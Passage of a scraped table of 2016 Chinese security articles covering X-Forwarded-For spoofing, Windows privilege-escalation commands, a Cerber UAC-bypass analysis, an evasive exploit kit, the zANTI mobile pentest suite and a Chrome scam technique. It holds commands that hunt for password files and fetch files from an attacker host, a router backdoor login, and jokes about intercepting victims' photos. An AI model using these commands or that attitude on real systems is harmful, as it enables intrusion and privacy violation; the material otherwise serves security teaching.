deflate, sdchAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: Hm_lvt_380ffd3c2225d34ca2087c6970395366=1473755162; Hm_lpvt_380ffd3c2225d34ca2087c6970395366=1473755299; sc_is_visitor_unique=rx4067297.1473755300.43C8C2ACB3CA4FAAEB8885235516D36A.1.1.1.1.1.1.1.1.1X-Forwarded-For: 127.0.0.111111返回信息是:您的IP地址: 127.0.0.1111113 正确的代码示例在X-Forwarded-For信息头中可以提取真实的用户IP，但是这个IP是可以伪造的，如果从X-Forwarded-For提取IP作为用户的IP对于存在登录次数，api速率限制等一些接口是致命的缺陷，因为任意构造出无数的合法或者非法IP地址。而REMOTE_ADDR只是服务器前端的IP地址，如果没有代理就是用户的真实地址。这个是不可伪造的，而且代理是有限的，可以基于此来获取IP。在wordpress中，获取客户的IP地址代码如下：$remote_ip = preg_replace( '/[^0-9a-fA-F:., ]/', '', $_SERVER['REMOTE_ADDR'] );如果是python代码的话：remote_ip = request.META.get(‘REMOTE_ADDR’, None)当然上述代码也存在缺陷，就是服务器端开了nginx反向代理的时候，每次获取的都是反向代理的IP，这不是我们的预期，需要nginx在配置反向代理的时候做一定设置并且修改代码。如：proxy_set_header            Host $host;proxy_set_header            X-Real-IP $remote_addr;proxy_set_header            X-Forwarded-For $proxy_add_x_forwarded_for;或者采用realip模块，配置如下：set_real_ip_from   10.1.10.0/24;real_ip_header      X-Forwarded-For;在存在反向代理的情况下，如果直接获取REMOTE_ADDR，得到的是反向代理IP的值，从上面的配置也可以看出，在反向代理nginx的配置中将REMOTE_ADDR赋给了X-Real-IP，那么也是从X-Real-IP中来获取用户的IP，如下才是正确的获取用户IP的方式：def get_ip(request):    try:        return request.META['HTTP_X_REAL_IP']    except KeyError:        return request.META.get('REMOTE_ADDR',None)4 总结X-Forwarded-For可被用户伪造，不应该被信任；REMOTE_ADDR是使用“REMOTE_ADDR”机器的前一个建立tcp连接的机器的地址，是不可伪造的，在无代理时可以理解为用户的IP地址，有反向代理时，先将REMOTE_ADDR赋给X-Real-IP，最后可以从X-Real-IP中获取用户的IP。参考文献：http://gong1208.iteye.com/blog/1559835http://devco.re/blog/2014/06/19/client-ip-detection/http://blog.pengqi.me/2013/04/20/remote-addr-and-x-forwarded-for/","2016-10-19 22:44:23","Web安全","获取用户IP的正确姿势","http://nsoad.com/Article/web/20161019/605.html"
"5ccbfa944f2f0a0a7a69c08f","web worker 是运行在后台的 JavaScript，不会影响页面的性能。 当在 HTML 页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。","blackhold","这不是一篇渗透测试指导，而是简单介绍了几个Windows内网提权的实用命令，以供我等菜鸟学习观摩，还望大牛包涵指导。1.获取操作系统信息识别操作系统名称及版本：C:\Users\thel3l&gt; systeminfo | findstr /B /C:""OS Name"" /C:""OS Version"" OS Name: Microsoft Windows 10 ProOS Version: 10.0.14393 N/A Build 14393当然中文系统你得这样：systeminfo | findstr /B /C:""OS 名称"" /C:""OS 版本""识别系统体系结构：C:\Users\thel3l&gt; echo %PROCESSOR_ARCHITECTURE% AMD64查看所有环境变量：C:\Users\thel3l&gt; SETUSERNAME=thel3lUSERPROFILE=C:\Users\thel3l*snip*查看某特定用户信息：C:\Users\thel3l&gt;net user thel3l User name thel3l*snip*The command completed successfully2.获取网络信息查看路由表信息：C:\Users\thel3l&gt; route print查看ARP缓存信息：C:\Users\thel3l&gt; arp -A 查看防火墙规则：C:\Users\thel3l&gt; netstat -ano C:\Users\thel3l&gt; netsh firewall show config C:\Users\thel3l&gt; netsh firewall show state 3.应用程序及服务信息查看计划任务：C:\Users\thel3l&gt; schtasks /QUERY /fo LIST /v 中文系统的命令，先调整GBK编码为437美国编码：chcp 437然后schtasks /QUERY /fo LIST /v查看服务进程ID：C:\Users\thel3l&gt; tasklist /SVC查看安装驱动：C:\Users\thel3l&gt; DRIVERQUERY 查看安装程序和版本信息（漏洞利用线索）：C:\Users\thel3l&gt; wmic product list brief 查看服务、进程和启动程序信息：C:\Users\thel3l&gt; wmic service list brief C:\Users\thel3l&gt; wmic process list briefC:\Users\thel3l&gt; wmic startup list brief查看.msi程序的执行权限：C:\Users\thel3l&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedC:\Users\thel3l&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated查看是否设置有setuid和setgid：C:\Users\thel3l&gt; reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits查看安装补丁和时间信息：C:\Users\thel3l&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn查看特定漏洞补丁信息：C:\Users\thel3l&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:""KBxxxxxxx""4.敏感数据和目录查找密码文件或其它敏感文件：C:\Users\thel3l&gt; cd/ C:\Users\thel3l&gt; dir /b/s password.txtC:\Users\thel3l&gt; dir /b/s config.* C:\Users\thel3l&gt; findstr /si password *.xml *.ini *.txtC:\Users\thel3l&gt; findstr /si login *.xml *.ini *.txt无人值守安装文件：这些文件通常包含base64模式的密码信息。这类文件在一些大型企业网络或GHO系统中可以发现，文件通常的位置如下：C:\sysprep.infC:\sysprep\sysprep.xmlC:\Windows\Panther\Unattend\Unattended.xmlC:\Windows\Panther\Unattended.xml5.文件系统可以通过调用系统预安装程序语言查看当前可访问目录或文件权限，如python下：import os; os.system(""cmd /c {command here}"") 使用copy con命令创建ftp执行会话：范例 C:\Users\thel3l&gt; copy con ftp.bat #创建一个名为ftp.bat的批处理文件ftp # 输入执行会话名称，按回车到下一行，之后按CTRL+Z结束编辑，再按回车退出C:\Users\thel3l&gt; ftp.bat # 执行创建的文件ftp&gt; # 执行ftp命令ftp&gt; !{command} # e.g. - !dir or !ipconfig使用copy con命令创建VBS脚本文件：C:\Users\thel3l&gt; copy con commandExec.vbs #创建VBS脚本文件Call WScript.CreateObject(""Wscript.Shell"").Run(""cmd /K {command}"", 8, True) #VBS文件内容C:\Users\thel3l&gt; commandExec.vbs #执行脚本文件检查文件夹可写状态：C:\Users\thel3l&gt; dir /a-r-d /s /b6.一个有用的文件上传脚本' downloadfile.vbs ' Set your settingsstrFileURL = ""http://{YOUR_IP}/{FILE_NAME.EXT}""strHDLocation = ""c:\\{FILE_NAME.EXT}""' Fetch the fileSet objXMLHTTP = CreateObject(""MSXML2.XMLHTTP"")objXMLHTTP.open ""GET"", strFileURL, falseobjXMLHTTP.send()If objXMLHTTP.Status = 200 ThenSet objADOStream = CreateObject(""ADODB.Stream"")objADOStream.OpenobjADOStream.Type = 1 'adTypeBinaryobjADOStream.Write objXMLHTTP.ResponseBodyobjADOStream.Position = 0 'Set the stream position to the startSet objFSO = Createobject(""Scripting.FileSystemObject"")If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocationSet objFSO = NothingobjADOStream.SaveToFile strHDLocationobjADOStream.CloseSet objADOStream = NothingEnd ifSet objXMLHTTP = Nothing该脚本是一个社区发布的，你可以以下这种方式运行它：C:\Users\thel3l&gt;cscript.exe downloadfile.vbsbitsadmin命令：如果你的目标系统是Windows 7及以上操作系统，你可以使用bitsadmin命令，bitsadmin是一个命令行工具，可用于创建下载上传进程：范例C:\Users\thel3l&gt; bitsadmin /transfer job_name /download /priority priority URL local\path\file C:\Users\thel3l&gt; bitsadmin /transfer mydownloadjob /download /priority normal ^ http://{YOUR_IP}/{FILE_NAME.EXT} C:\Users\username\Downloads\{FILE_NAME.EXT}如：bitsadmin /transfer n http://download.fb.com/file/xx.zip c:\pentest\xx.zip*参考来源：thel3l.me，FB小编clouds编译，转载请注明来自FreeBuf（FreeBuf.COM）","2016-09-24 14:19:25","Web安全","Windows内网渗透提权的几个实用命令","http://nsoad.com/Article/web/20160924/444.html"
"5ccbfa944f2f0a0a7a69c090","为什么Signal会被认为是最安全的即时消息应用？这是由于它只会储存很少量的关于用户和事件的信息。","silence","前言相隔好几个月，“北极熊”再次更新，像我那么勤快的人好像已经不多见了。。。。安全工具，更新频率都不是很高，说实在的一句话，好用就行，本次可以说是大改，以及大量调整，曾经有人反馈，速度不快，容易崩溃的问题等等，当初软件官方发布的时候，默认线程，程序延迟，都不是最佳的，这次呢，干脆放开软件，让他“疯起来”。更新亮点一：网址爬虫开放了一句话木马扫描XSS检测资源探测自定关键字扫描二：更好的网站检测速度三：网站扫描-端口扫描，可直接将扫描结果发送进来，直接进行端口探测软件信息软件名称：北极熊扫描器软件版本：4.0文件大小：8.38MB（安装包）下载地址：http://pan.baidu.com/s/1i5dk1wh官方下载：http://www.im-fox.com/x.rar使用帮助：帮助文档北极熊4.0 分割版本工具是从【北极熊扫描器4.0】当中分割出来的，特点是扫描快速，并且可以导出为电子表格，支持端口扫描，文件仅有：347KB，软件支持线程控制，自动输出等一、导入网址（通过北极熊启动的话可以直接将数据发送到本软件中）二、扫描设定（可以不进行任何改动，注意端口分隔符号）三、点击开始检测【如果增加过多的端口检测扫描速度会变慢哦】四、导出表格五、网段扫描软件信息软件名称：Polar bear 4.0 Scanning tool文件大小：347KB主要功能：网段扫描，网址扫描，表格查看，内容过滤下载地址： http://pan.baidu.com/s/1c20vpks 密码: 6rk4","2016-10-04 16:51:08","安全工具","北极熊扫描器4.0发布，无需过多介绍的国产安全工具","http://nsoad.com/Security-tools/20161004/tools-488.html"
"5ccbfa944f2f0a0a7a69c091","* 本文原创作者：zzz66686，本文属FreeBuf原创奖励计划，未经许可禁止转载1. 引言关于Bypass UAC这个主题，早已有了很多很成熟的方法，但普遍是以demo的形式出现，让大家参","Kong","* 本文原创作者：zzz66686，本文属FreeBuf原创奖励计划，未经许可禁止转载1. 引言关于Bypass UAC这个主题，早已有了很多很成熟的方法，但普遍是以demo的形式出现，让大家参考学习的。在本文中，笔者拿出一个运用bypassUAC技术的病毒实例Cerber进行分析，通过逆向分析该实例让各位读者能够对bypass UAC的完整执行过程有一个正确的认识。Cerber是一款著名的勒索软件，如果对勒索软件有过一些研究，那一定听说过这款勒索软件。此外，本文可以作为www.freebuf.com/sectool/95661.html 的补充，该文只提到了一个工具的使用，而本文则深入讨论了Cerber中用到的Bypass UAC的技术细节。2. 整体概述Cerber勒索软件有多种运行模式，在启动时传递不同参数会进入不同的模式，但本文并不对Cerber勒索软件本身进行分析。如果启动默认模式，即以无命令行参数启动Cerber勒索软件，那么其执行流程是这样子的：其中，dropper是拿到的样本；launcher隐藏在dropper内的另一个执行体，dropper会在内存中直接加载launcher。此后，launcher会检测当前执行体的所在路径，若不在其指定位置，则将其复制到指定位置即%APPDATA%\Roaming，然后重新加载运行自身；若已在其指定位置，则进行bypass UAC以管理员权限重新加载自身。最后，样本会开始其恶意行为，如加密用户文件等。至于UAC的严格定义，可以参考msdn。这里仅仅摘抄下度娘：用户帐户控制（User Account Control, UAC）是Windows Vista的一个重要的新增安全功能。它可以防止恶意软件获取特权，就算用户是以管理员帐户登录也可以起到保护作用。简言之，可以把UAC理解为下图内容：本文的研究内容即为Cerber是如何静默地过掉该提示，并以管理员身份运行自身。也就是研究第一幅图中的Bypass UAC的环节。3. 详细分析受限于篇幅原因，本文就不介绍bypass UAC之前的内容。按照第二章整体概述的说明，应该可以很快的找到bypass UAC的起始位置，这里直接开始分析其bypass UAC的过程。首先，在%SystemRoot%\system32目录下寻找一个Windows白名单程序。这里所谓的Windows白名单程序特指有UAC权限且不触发UAC对话框的系统程序：其查找过程是通过FindFirstFile实现的，获取文件之后取其后缀名，与.exe比较    在笔者的调试环境中，最终会找到AdapterTroubleshooter.exe这个可执行文件：     第二步，获取AdapterTroubleshooter.exe的manifest资源文件，方法如下：    进而在获取的manifest中查找是否有autoElevate标签，并判断其标签内容是否为true；然后查找是否有requestedExecutionLevel标签，判断其标签的level属性是否为requireAdministrator。    样本找到的AdapterTroubleshooter.exe显然满足以上条件，顺利进入下一步。如果不满足会继续第一步的查找过程，找到一个新的可执行程序。第三步，遍历AdapterTroubleshooter.exe的导入表，找到一个可以被劫持的dll。其判断是否可被劫持的方法是调用ZwOpenSection函数，判断其返回值是否成功。如果ZwOpenSection返回成功，则该dll不可作为劫持dll；反之，则可劫持。相关函数的作用以在上图中标出。下图展示了调用ZwOpenSection函数判断是否可以劫持的逻辑流程。    在笔者的测试机中，Cerber发现了d3d9.dll可以被劫持。第四步，将d3d9.dll复制到临时的目录中，并在结尾处追加一个新的段，可以用PEiD查看：其追加内容如图所示：    此外，d3d9.dll的入口点也被修改：由图可见，原入口点被挂钩，直接跳到新添加的段中执行，原有代码不会再执行。第五步，创建并挂起explorer.exe，向该进程写入Cerber完整执行体，执行参数和小段shellcode，并通过hook原有代码的方式执行shellcode，shellcode调用Cerber执行体中的文件复制函数，并将参数传给该函数。在explorer中申请空间，然后3个WriteProcessMemory函数分别写入Cerber执行体，参数和shellcode：上图中的注释已经写明本次调用WriteProcessMemory写入的内容。第六步，在explorer.exe进程中可以看到写入的shellcode内容：B8 00 10 30 00 50 B8 E1 55 2E 00 FF D0 C3，如下图：其中，0×301000是执行WriteProcesMemory之前确定的，其他的几个字节是固定的。explorer.exe的作用就是通过IFileOperation的COM对象将d3d9.dll和AdapterTroubleshooter.exe复制到system32目录，并启动AdapterTroubleshooter.exe，使被劫持的d3d9.dll被加载。用COM对象进行复制操作的原因是为了避免因为复制文件到关键目录而弹出UAC提示。第六步，在d3d9.dll的执行过程中，可以看到之前增加的段作用：通过d3d9.dll加载时的参数，获取d3d9.dll的基址，然后通过该基址查找新增加段的位置，最后调用WinExec函数。上图为获取d3d9.dll的基址。新增加段的前8个字节分别为WinExec和ExitProcess函数的地址，如下图：    最后，调用WinExec并将字符串参数传入：注意，在此前的步骤中，Cerber已将自己重命名为PnPutil.exe，希望读者不要误会这个奇怪的名字。至此，Cerber就已经bypass UAC了。此后还有一些清理工作，如果读者有兴趣的话，可以继续分析，本文的分析就到此为止了。4. 小结本文展示了一种较为流行的bypass UAC方法,并以恶意软件Cerber为实例，逆向分析了其bypass UAC的每一步细节，该方法也确实有不错的实际效果。笔者忠心希望本文能给读者一点启发和帮助，但由于笔者知识有限，才疏学浅，文中不当或错误之处还请各位读者包容和指正。最后，还希望本文仅作为技术讨论，切勿用于非法目的。* 本文原创作者：zzz66686，本文属FreeBuf原创奖励计划，未经许可禁止转载","2016-09-03 13:11:08","系统安全","Bypass UAC的一个实例分析","http://nsoad.com/Article/system/20160903/345.html"
"5ccbfa944f2f0a0a7a69c092","感谢hanc00l爬取了wooyun的网页，才使乌云关闭后，大家依旧可以访问以前的漏洞库、知识库。hanc00l发布了基于flask或者torndo的乌云公开漏洞、知识库搜索的github项目，同时发布了已经配置好的虚拟机，允许","blackhold","BrowserExploit是一种先进的浏览器漏洞攻击包（通常指利用浏览器的漏洞来渗透目标），常见的比如IE的漏洞都可能导致目标设备在访问恶意页面后直接被GETSHELL，另外其他的比如Flash漏洞也都是可以通过浏览器来触发的，因此也可纳于Browser Exploit范畴。Browser Exploit适用于内部和外部渗透测试，以帮助相关人员获取访问内部计算机的权限。 Browser Exploit使用了大量的技术来绕过杀毒软件，其特色主要包括：JavaScript混淆技术（逻辑异或，JS iFrame框架头，Cookie加密，分块加密iFrame，Base64 随机空间）；先进的开发技术；基于流量学习的人工智能；多用户就绪平台（ready platform）；过滤杀毒软件连接；逃避网站域名过滤器；反蜜罐功能欺骗非法用户和安全用户；绕过Windows DEP / ASLR / UAC；先进的多态shellcoding；（shellcoding字面意思是编写可以返回远程shell的代码，现在指一切可以被插入到漏洞利用(Exploit)中执行特定功能的字节码）它对于非技术人员的意义是什么呢？如果你在自己的浏览器上上网冲浪，一旦你访问了被browser exploit攻击包感染的网页，那么你就很有可能在没得到任何提醒的情况下被恶意软件感染，运行恶意软件。其他特征：Windows 8/8.1/10 CFG(控制流保护)绕过；SQL组织结构；代码优化以实现在重负载网络中运行；提醒：这款工具并不是用于脚本小子或那些技术一般的黑客们（或者程序员）。其本质上是一个平台，可以通过增加更多exploit的方式来构建自己的代码，平台上存在很多漏洞信息，其中一些漏洞增加了使用难度，以防止存在非法目的的黑客轻易地运行此代码。下载地址","2016-09-07 20:34:08","安全工具","高级浏览器漏洞攻击包：BrowserExploit","http://nsoad.com/Security-tools/20160907/tools-361.html"
"5ccbfa9e4f2f0a0a7a69c093","zANTI是一款Android平台下的渗透测试工具，支持嗅探已连接的网络、支持中间人攻击测试、端口扫描、Cookie获取及路由安全测试等操作。该工具是由以色列移动安全公司Zimperium开发的。此外，它能够支持一系列","Kong","0x00 前言zANTI是一款Android平台下的渗透测试工具，支持嗅探已连接的网络、支持中间人攻击测试、端口扫描、Cookie获取及路由安全测试等操作。该工具是由以色列移动安全公司Zimperium开发的。此外，它能够支持一系列的网络任务：MAC变更、zther（对欺骗的手机端实现了记录请求、记录图像、zpacketEditor、SSL strip、重新导向HTTP、替代图片、获取下载、截获下载、插入HTML等一系列强大的功能。）routerpwn.com、云报告、WIF监控器、HTTP服务器等一系列使用功能。此外还提供了可用性指导，诸如教程、基本信息、设置、设置语言，重点是支持中文）。本次重大更新。0x01 获取 zANTI 安装包在国内很多 Android 应用商店中，都没有提供 zANTI 软件包的下载。所以，用户必须要在 zANTI 工具的官网下载。其地址为：https://www.zimperium.com/zanti-mobile-penetration-testing （填入的最好是139邮箱或者网易邮箱，QQ邮箱，本人亲测无效）在浏览器中访问以上地址后，将打开如图所示的界面。填入邮箱后，我们打开邮箱，可以看到下载链接。之后进行下载安装。这里为了方便大家，百度网盘：链接：http://pan.baidu.com/s/1qXJsUZU 密码：bdi5 ，提示：在安装 zANTI 工具之前，最好先将移动设备 Root。否则，zANTI 工具的一些功能将无法使用。0x02 扫描网络渗透测试是一种安全性较大的工作。所以，在实施渗透测试之前进行一些简单设置。如修改 MAC地址、了解网络等。通过进行简单的配置，不仅可以保护自己的身份被暴漏，而且还可以提高渗透效率。如果要想扫描其它无线网络，则需要首先连接到该网络。但是，为了安全起见，大部分用户都会将其网络进行加密。所以，如果要连接某网络，则必须知道该网络的密码。如果用户是使用白盒子渗透测试的话，则可以直接输入被渗透方提供的密码，并连接到网络内。如果进行黑盒子渗透测试的话，则需要破解密码。例如，用户可以直接在 Android 设备上安装万能钥匙。或者，使用其它无线网络渗透工具，如 Aircrack-ng 和 Wifte 等1.修改MAC地址当我们经常进行网络扫描，往往会被一些WIFI网络设备拦截扫描，这时我们可以修改MAC地址进行绕过进行扫描。同时此处的MAC改变并非所有android设备都支持该功能。2.重新扫描网络对于网络发生更改的WIFI或者对于新加入的一些设备，我们往往需要重新扫描网络发现新加入的的设备。这时的操作如下所示：3.WIFI监控器在这里，我们可以找到可用的WIF网络，并且可以看到相关WIF的MAC地址和信号频道。也可以直接输入WIFI的密码进行连接。4.设置在这里我们可以看到WIF设置，可以直接调用WIF设置，WIFI策略、一般选项、扫描选项等等设置，熟悉这些设置对于我们灵活进行网络渗透测试极有帮助。0x03 攻击目标zANTI 是 Android 平台下另外一款最知名的渗透测试套件之一。使用该套件，用户可以很方便的在 Android 下实施各种常见的渗透测试工作，如密码攻击、漏洞探测、中间人攻击（图片替换、拦截客户端请求和下载的文件等1.扫描整个网段当我们连接某个WIFI的时候，我们可以直接扫描整个网段，如果整个网段的终端比较多，扫描的时间可能需要10-30分钟，大家要耐心等候。并且手机尽量保持满电状态，因为扫描需要消耗很多电量。2.合作行动-扫描当我们完成了扫描整个网段，这时我们会得到一系列的IP（这里的IP指对应的终端移动设备），这时我们可以选择其中一个IP，发动进一步的攻击。这时我们点击某个IP，进行如下界面，从上图，我们可以看到【合作行动】中有一个选项【扫描】，这时我们可以对目标IP进行深一步的扫描动作，这个扫描动作非常强大，集合了NMAP的各种扫描功能，甚至也包含了NMAP的NSE脚本扫描功能，使用NMAP的NSE脚本进行各种服务漏洞的扫描，甚至更进一步进行漏洞攻击，因为NSE中有500多种脚本检测和攻击。2.合作行动-连接至远程端口在这个动作中，我们如果扫描到类似telnet、ssh、MySQL、路由器管理界面等等相应的端口和服务，这时我们就可以尝试连接上这些服务。此外，还可以自己添加端口和服务，这个就可以满足当某个服务不是使用常规端口时的需求以及一些其他服务及其对应端口。3.密码复杂度审计这个功能可以帮助我们对扫描出来的常见协议和服务进行暴力破解，可以使用各种字典，例如小字典，优化后的字典，大字典、巨型字典，甚至也支持自定义字典，这个功能实在贴心服务。因为在进行企业内部无线审计的时候，往往会根据企业内部的弱密码规律进行收集一些字典。这时就可以进行个性化的密码复制都审计了。4.中间人攻击不得不说，这个是zANTI最强大的功能，真正意义上的黑客。这个中间人攻击对欺骗的手机端实现了记录请求、记录图像、zpacketEditor、SSL strip、重新导向HTTP、替代图片、获取下载、截获下载、插入HTML等一系列强大的功能。对于受害者的上网请求和图片和下载的文件一一截获。举例：一个妹子在微信上给A同学发送了一张相片(是啥相片，大伙自由想象），然后B同学使用了这个中间人欺骗，截获了这图片。你们猜猜，那感觉多美好啊。再举一个例子：某个商业客户C把商业文件通过这个WIFI发送公司职业D，刚刚好在同一个WIFI下，有个安全爱好者F使用了中间人欺骗，一不小心把这个商业文件给中间截获了，看到了里面客户信息（姓名、手机号码、报价、订单等等）。哈哈哈①已记录的请求从上图，我们可以看到有些是微信的请求，有些是浏览器的请求。可以想象受害者在流量哪些网站，我们一目了然。如果是浏览了XXX网站，我们也可以获取到一些网站地址，收藏着以后慢慢看，哈哈。例如某些公司内部网站或者是一些登录界面管理后台等等。至于还有什么网站，大伙自己猜猜，哈哈②已记录的图像从对方的手机从可以截获各种图片，例如别人在浏览朋友圈，如果朋友圈是有很多相片的，那么我们在这里也可以截获到这些相片。再如在公共场合连接WIFI时，我们可以截获特定用户的相片，尤其是这些相片是保存了账号和密码的时候。当然有些相片是截获不到的。例如GIF等动态图③ zPacketEditor互动模式，允许修改每个单独的HTTP请求，并在他们通过设备时回复。使用这个功能可以直接重放对方的浏览请求，这个对于类似的短信炸弹或者接口调用函数这些很有好处。④替代图片这个功能可以让我们选择任意图片，开启这个功能后，对方手机上的HTTP页面上的所有图片都会被一张图片替代，这张图片可以任意选择。至于怎样恶搞，大伙可以自由发挥，哈哈。此外有很多功能等待我们去探索，例如HTTP服务器，HTTP重定向等等。ssl 攻击等等。并且以及把这个东西应用在各种场合达到各种目的，是在太邪恶了。哈哈。0X04 Routerpwn.com当用户成功连接到一个 WiFi 网络后，可以利用路由器中存在的漏洞进行攻击，从而控制其路由器。在 zANTI 工具中，提供了一个常见路由器的漏洞网站——Routerpwn.com。用户可以通过查询该网站，找出其路由器中存在的漏洞，并进行渗透攻击来控制其路由器。用户可以使用两种方法打开路由器漏洞网站。第一种，是在浏览器地址栏中直接输入 http://routerpwn.com/。第二种，是在 zANTI 工具的网络任务选项列表中单击 Routerpwn.com 选项，即可打开该网站，如图 所示就是路由器漏洞网站的主页面。从该界面可以看到，包括很多类路由器，如常见的 HUAWEI、TP-LINK、Zoom、D-Link 等。在该界面选择任何一类型路由器，即可查看存在的漏洞信息。例如，查看 TP-LINK 路由器中存在的漏洞。Category）、源地址（Source）、标题（Title）和创始人（Author）。如果想查看漏洞的详细信息，则单击 Source 列的地址查看。从该界面显示的最后一个漏洞，可以看到该路由器存在Webshell 后门。其中，用户名为 osteam，密码为 5up。所以，用户可以尝试使用该用户名和密码登录路由器的 Webshell。这个是非常实用的功能库，可以说是一个无线设备的漏洞库，实在做得不错。大大赞一个。","2016-09-26 12:45:01","安全工具","Android平台渗透测试套件–zANTI2.5","http://nsoad.com/Security-tools/20160926/tools-453.html"
"5ccbfa9e4f2f0a0a7a69c094","爬虫新时代在早期互联网世界，","blackhold","通常情况下，网络犯罪分子在通过技术支持服务来进行诈骗活动时，需要使用到一些钓鱼网站，并在钓鱼页面中包含一些伪造的警告信息。诈骗分子需要通过这些警告信息来欺骗用户，让他们立刻去访问链接中的技术支持中心来获取帮助服务。这也是一种常见的攻击方式。但是在这篇文章中，我们将会给大家介绍一种专门针对谷歌Chrome浏览器用户的新型诈骗技术。网络诈骗分子又出新花样告诉大家一个消息，通过技术支持服务来进行网络诈骗的犯罪分子们又设计出了一种新的花招来欺骗那些不明真相的吃瓜群众。通过一张精心设计的图片文件，在配合谷歌Chrome浏览器的全屏模式，攻击者就可以开始对你进行攻击了。他们的新型诈骗策略需要用到一个经过特殊设计的技术支持页面，这个网站页面要模仿微软官方网站的界面风格来实现。当用户通过Chrome浏览器访问这个伪造的页面时，隐藏在页面中的JavaSrcipt代码会将用户的Chrome浏览器切换至全屏模式。使用过Chrome浏览器的同学肯定都知道，此时浏览器顶部的工具栏会自动隐藏，当然也包括地址栏在内。这时候，诈骗分子就可以在网页顶部加载一个JPEG格式的图片，并将其外观设计成与Chrome的工具栏一模一样。当用户将他们的鼠标移动到页面顶部的区域时，他们并不会发现任何的异常。除非用户使用了某种自定义的Chrome主题，或者使用的是用户界面风格不同的Chrome浏览器。“逼真”的地址栏这个伪造出来的地址栏非常有意思，因为我们这些年来一直都在告诉用户，在访问一个网站之前，一定要确认浏览器地址栏中的URL地址是否为合法正规的网站地址。当浏览器加载了这个诈骗页面之后，浏览器便会自动进入全屏模式。这一切操作完成之后，该页面还会通过不断弹出警告窗口的形式来防止用户关闭该网页。接下来，让我们来看一看这个如此“逼真”的地址栏，网页界面如下图所示。实际上，下图所示的这个网站看起来的确和微软公司的官方网站没多大区别，除了地址栏中的URL参数“ru-ru”（俄罗斯？）看起来有些可疑之外，其他的设计还是不错的。现在，让我们来深入分析一下，这种伪造页面到底是如何实现的。我们发现，这个伪造出来的地址栏无非只是一张JPEG格式的照片而已，这张图片被放置在了一个恰当的位置，所以当Chrome切换到全屏模式时，它才会看起来非常的逼真。伪造出原生风格的Chrome弹出窗口Malwarebytes公司的安全团队在发现了这种新型的攻击技术之后，他们又发现了另外一种针对Chrome用户的网络诈骗技术。Chrome浏览器有一个非常有意思的功能，它提供了一个“阻止该页面弹出额外窗口”的选项，这个功能非常的有用。因为很多网站在用户关闭网页的时候，会弹出一些类似“您确定要离开这个页面吗？”以及“您真的确定要这样做吗？”这样的弹窗警告，很多用户对此确实深表反感。在另一种攻击场景中，诈骗分子可以模仿Chrome原始的警告弹窗风格来伪造出一个弹出窗口。Chrome浏览器会询问用户是否需要禁用该页面的弹窗功能，此时就是这个伪造弹窗发挥作用的时候了。当用户选择禁用该页面的弹窗功能之后，诈骗分子就可以通过这种伪造的弹窗来不断地显示出更多的警告窗口。诈骗分子所期望的是，当Chrome浏览器检测到了网站页面中带有JavaSript弹窗警告功能时，向用户显示“是否需要禁用该页面的弹窗功能”的确认窗口，用户会根据自己的实际需要来进行选择。但是当用户点击了伪造弹窗中的“OK”按钮之后，网页将会弹出更多的窗口。细心的同学们可能已经发现了，上图所示的对话框中甚至还出现了单词拼写错误的情况，诈骗分子们能不能用点心啊？可能看到这里，朋友们甚至已经忘记了真实的Chrome对话框是什么样子的了，请往下看：请注意，诈骗分子在这里还用了另外一个小技巧，即上图所示的“PressESC, to close this page!”（按下ESC键关闭该页面）。这里存在几个错误：首先，这段代码中存在语法错误，因为我们不会在一句完整的话中加入逗号；除此之外，这也并不是Chrome浏览器会提供的功能。结束语安全研究专家认为，基于浏览器的技术支持诈骗目前还不会引起非常大的麻烦。但不好的消息是，大多数浏览器都无法抵御恶意JavaSript脚本的攻击，当这些恶意脚本修改了用户的浏览器配置之后，用户将不得不向技术支持服务中心寻求帮助。就目前的情况来看，想要发现这些诈骗行为其实并不容易，所以我们才认为需要将这种诈骗技术的内部工作机制曝光出来。","2016-09-02 12:31:04","Web安全","劫持Chrome浏览器的“新方法”","http://nsoad.com/Article/web/20160902/344.html"
"5ccbfa9e4f2f0a0a7a69c095",,"Kong","0×00 前言zANTI是一款Android平台下的渗透测试工具，支持嗅探已连接的网络、支持中间人攻击测试、端口扫描、Cookie获取及路由安全测试等操作。该工具是由以色列移动安全公司Zimperium开发的。此外，它能够支持一系列的网络任务：MAC变更、zther（对欺骗的手机端实现了记录请求、记录图像、zpacketEditor、SSL strip、重新导向HTTP、替代图片、获取下载、截获下载、插入HTML等一系列强大的功能。）routerpwn.com、云报告、WIF监控器、HTTP服务器等一系列使用功能。此外还提供了可用性指导，诸如教程、基本信息、设置、设置语言，重点是支持中文）。本次重大更新。0×01 获取 zANTI 安装包在国内很多 Android 应用商店中，都没有提供 zANTI 软件包的下载。所以，用户必须要在 zANTI 工具的官网下载。其地址为：https://www.zimperium.com/zanti-mobile-penetration-testing （填入的最好是139邮箱或者网易邮箱，QQ邮箱，本人亲测无效）在浏览器中访问以上地址后，将打开如下图 所示的界面。填入邮箱后，我们打开邮箱，可以看到下载链接。之后进行下载安装。这里为了方便大家，百度网盘：链接：http://pan.baidu.com/s/1qXJsUZU 密码：bdi5  ，提示：在安装 zANTI 工具之前，最好先将移动设备 Root。否则，zANTI 工具的一些功能将无法使用。0×02 扫描网络渗透测试是一种安全性较大的工作。所以，在实施渗透测试之前进行一些简单设置。如修改 MAC地址、了解网络等。通过进行简单的配置，不仅可以保护自己的身份被暴漏，而且还可以提高渗透效率。如果要想扫描其它无线网络，则需要首先连接到该网络。但是，为了安全起见，大部分用户都会将其网络进行加密。所以，如果要连接某网络，则必须知道该网络的密码。如果用户是使用白盒子渗透测试的话，则可以直接输入被渗透方提供的密码，并连接到网络内。如果进行黑盒子渗透测试的话，则需要破解密码。例如，用户可以直接在 Android 设备上安装万能钥匙。或者，使用其它无线网络渗透工具，如 Aircrack-ng 和 Wifte 等1 修改MAC地址  当我们经常进行网络扫描，往往会被一些WIFI网络设备拦截扫描，这时我们可以修改MAC地址进行绕过进行扫描。同时此处的MAC改变并非所有android设备都支持该功能。2 